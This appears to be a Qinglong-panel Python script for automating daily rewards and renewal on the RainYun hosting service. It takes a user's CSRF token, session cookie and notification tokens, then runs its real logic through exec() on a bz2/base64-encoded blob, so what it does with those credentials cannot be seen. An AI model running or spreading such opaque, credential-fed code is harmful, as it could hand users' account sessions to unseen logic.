## created by 青龙客户端 2024-06-11 20:18:16.026296
# encoding:utf-8 #

"""

    联系电话：110
    
    雨云
    2024/6/10
    ver 1.0

    实现了 每日奖励 自动续费

    变量名：yuanshen_yy

    抓含csrf 的 url 的 X-CSRF-Token 和 cookie

    群发 wxpusher

    TopicId appToken

    分隔符：#
    格式: export yuanshen_yy = X-CSRF-Token#cookie#TopicId#appToken#备注 

    定时：每小时一次
    cron:0 0 0/1 * * ? 

"""

#   --------------------------------一般不动区--------------------------------
#
#                                               #v;;@
#                                           .8@;;;3;;;;&@@u
#                                     ##%$$$$;;;*n8;;$;;;~&$$$$$@&          3@
#                                +@$%$$$$$$$%!;;;%;a$%*;;#$$$$%$$$$%$@!    *n *@n
#                              &$$$$$$$$$$$$$@*;;;$;;;;;@$$%$$$$$$$$$$%$$@%
#                             $$$$$$$$$$$$$$$$;;;;8;;;;$$$$$$$$i#$$%3i!@i@$$@
#                             #$$$$$$$$$$$$$$%$&&&#@@@@$$$$$$$#!!i#%#i!i3#$$$%&.&$
#                             @$$$$$$$$$$$$&@@@@@@@@&$$$$$$$$$%$!6@@iii6!!@@$@$$&.
#                          +&$%$@@@6iiiiizzzzuzzzzzazzzazzui!@@&%$$$$&i%$#@!i@%$$@
#                        #@@&&iiizzuazzaazzz@zzaazaaazazzzzaazzzzii#@$$$$$ii!i!$$%+
#                      @&&&@@uzzzzaazzzzzzi8zzzzazzazazaaizzzzazazzzaiii@$#!#i###
#                      @&&i#zzzazazzizi#@@6^izzzzzaazazu$izazzazzzzzaaz1iii8#$#@%%
#                      +i@zzzaazz11zzi!@+-%3zaaza1zzzi!#iaazz68zzzzzzzzz1iii&&#i$@
#                       i#1zazzza@azi38++. ;iuzzziazz8++*6azzzzzzzzzzzazazzii6&$&$.
#        .3       @    #i@zzzzaa3i@@3     .@&izzziu1#-- -@&###azuuzzaazzzzazzi&&# %^
#       z-i!*       a  ii@azzzzz@-6  @@@@   &@izz%#8- +8   $@3  &!azzzzzaaazzz@   -$#
#      o   !!1  -o  @+!8 @izaazz@ @  *&1    % %iaa#8  #   @@@@~  @izazzzaazzzzi    &$~
#     6    iii      3    .i1auaa! %        +o  -@i%.  @          @;$zazzzzzzaza    @%$.
#     n            !      #!iziiz@  %#;..8$        .  .@        @.a#zzaazzizzz%     $$@
#   * ^            #      va@ii3!ia$  ..                 ;&@@@1   %zzaaaaiizaz@
# ~;% ;           ~ #     @aaaz@#  ......     3           ....   $zzzza1i86azz#    za.@ 6
#     #          a .@@@   &aaaa@               -&@!       .... -6uiiizi#ai@izau    3z @;
#      ~         #        +uuuu!@                             ^++oiii%3-&1i&azz@   61~  &
#      -~        @         @uuu!-i63..                         $#@i+--%3iia!#izzu      * .
#        n       o          &311#iiiii@!                    .---o@#iii%aaaz-   i@&&^
#         @~      @          !31u@ii#i$&@@8!3#;-------++-1##3@ 8@.!iii1aaa&
#           #~;    !      #$#@%336$%#8@%%$$#&63i3n  @!!6668#&$$$$#!ii#aauu#
#        ..   +8~~~;;@@@&.@3#&$&%%#$&8888%&$$%$$%@&$$$$$$$$$$$@88888#uuuu$$-
#             .   .-%   6~@%$$8#$#$$88888888&#$#&a6%$%$#@8888888888@113u@$$$$
#                   1    -z$$$$6366%$%$&%88888&#&u;~;86686686%v%@611!3&$$$$#z  ;u
#                    1--+#^@$$$6$8#%aaai$668688;$&66668686688% a!338&$$$$$v.  .^@
#                      @@@@@$&#@ ^u%!uu%%88866$@#&8666686668%&   -a$&$$$@.  8@#
#                        $&##     @##816666666868#8666666366&$.   3u%$%@&8;*@ %@
#            @   @                 %#@366368$$@66866666666636&;&  @u%3$@#u$u-  o&
#       @ @. @ -v8i%               !6336666663&6666636!66336!66z~  @~#!11uuui1   #
#       @ @  @  @ @               #&&@663666$va$6666!33666666#&$%@  # @!1u33$6!!$  @
#       @ @ @.  @ @   @@@@- @&   @&$@1&6!636a$@1%6663!3333&$z1$$$$@@    +#838#!&v3   v
#       @@@ @ 8 -a@              @%$;&i$&666#n6%;3#3336@&&**#;#$$$#6za    .3$3131 -
#       n -@ @@ i@@.             #$@~%8$$$&@on@@@@$v&$%$$$$$$3n$$&iz%%a&     o33#
#              @   +            +&&@a&$$$%$$ou$$$$$&&~~$$$$1$@;$$&#%%z868$@@!;#3-
#                                v   .@&&$$$&$#%%%&@#&$&$$$$$&;#@@@&%$#%&@   %8u!
#                             !%&       #$&#ou6%!%#  .#&$$$$@       1 @$^
#                            a@ .i-i+ . ^&%%33!8%%%     #&&+       !1@#8@
#                            @$6-@  i#&    -8@@@@#@#^     @&^     %n*!@.
#                           &$$++i$
#                             .@$$%$
#
# ...................................................................
#           堂主保佑             永无BUG
#           堂主镇楼             BUG辟邪
#
#   堂主曰:
#
#        一日复一日，代码何其多！
#        只愿无bug，每日醉成仙！
#
# --------------------------------代码区--------------------------------

import bz2, base64
try:
  exec(bz2.decompress(base64.b64decode('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')))
except Exception as e:
  print('脚本执行出错',str(e))
